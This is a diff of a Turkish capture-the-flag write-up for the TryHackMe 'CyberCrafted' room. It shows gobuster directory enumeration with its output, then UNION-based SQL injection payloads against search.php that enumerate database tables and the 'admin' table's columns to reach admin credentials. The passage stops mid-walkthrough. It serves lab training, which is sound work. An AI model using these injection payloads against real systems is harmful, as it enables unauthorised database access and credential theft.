@@ -137,33 +137,86 @@ Sayfalara göz gezdiğimde herhangi bir güvenlik açığı görmedim.
 Gobuster çalıştırarak gizli dizinleri araştıralım.
 
 ```
-gobuster dir -u http://admin.cybercrafted.thm/ -w  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
+gobuster dir -u http://store.cybercrafted.thm/ -w  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
 ```
 
 
+```
+Burada her parametrenin anlamı:
 
+     dir: gobuster'a dizinleri veya dosyaları numaralandıracağımızı söyler.
+     -u: numaralandırılacak etki alanını/alt etki alanını/ip'yi tanımlar.
+     -w: kullanılacak kelime listesini ayarlayın, bu durumda dirbuster'dan “directory-list-lowercase-2.3-medium.txt”, bu Kali Linux'ta varsayılan olarak kurulur.
+     -x: Tanımlı uzantıya sahip dosyayı bulmak için bu parametreyi kullanabiliriz, her biri kelime listesindeki her kelimeye eklenir.
+```
 
+gobuster çıktısı:
+```
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://store.cybercrafted.thm/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 287]
+/index.html           (Status: 403) [Size: 287]
+/.html                (Status: 403) [Size: 287]
+/search.php           (Status: 200) [Size: 838]
+/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
+Progress: 2947 / 830576 (0.35%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 2967 / 830576 (0.36%)
+===============================================================
+Finished
+===============================================================                                                                                                      
+```
 
+search.php sayfasına bakalım.
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a3.png?raw=true)
 
+Siteye eriştiğimizde minecraft item arama sayfası olduğunu görüyoruz.
 
+SQL enjeksiyonu işe yarayabilir.
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a4.png?raw=true)
 
+Gördüğümüz gibi, arama terimi listelenen kelimelerin hiçbirini içermeden liste tüm öğeleri gösteriyor ve ayrıca herhangi bir uyarı veya uyarı da göstermiyor.
 
+Artık SQL enjeksiyonuna karşı savunmasız olduğunu biliyoruz, yönetici adını görmek için kullanabiliriz.
 
+Bu sayfayı SQL”UNION” sorgularıyla kötüye kullanabiliriz. Bilmemiz gereken ilk şey, orijinal SQL sorgusunun aldığı alanların sayısıdır; aşağıdaki kod parçası bize bu konuda yardımcı olabilir:
 
+```
+' UNION SELECT 1, ..., n #
+```
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a5.png?raw=true)
 
+```
+asdf' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables WHERE table_schema = 'webapp' #
+```
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a6.png?raw=true)
 
+Listelenen tablolardan bize ilgili bilgileri verebilecek olanı, bu durumda yöneticinin adını içerebilecek olanı seçmeliyiz. Daha sonra bu tablonun sütunlarına bakmak isteriz. Sorgu sonuncuya çok benzer, veritabanı şemasından sağlanan tabloya ait olan sütunları seçin.
 
+```
+asdf' UNION SELECT 1, 2, 3, column_name FROM information_schema.columns WHERE table_name = 'admin' #
+```
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a7.png?raw=true)
 
+Veritabanının yapısı hakkında daha fazla bilgiye sahibiz.
 
+Son SQL sorgularının amacı veritabanının yapısı hakkında ayrıntılı bilgi almaktı, bu şekilde herhangi bir tablodan bazı verileri sorgulayabiliriz.
 
-
-
-
-
-
-
-
+Bunu akılda tutarak, size daha fazla bilgi verebilecek olanları seçin; yöneticinin adını, şifresini ve mümkünse herhangi bir işareti almak istediğimizi unutmayın:
 
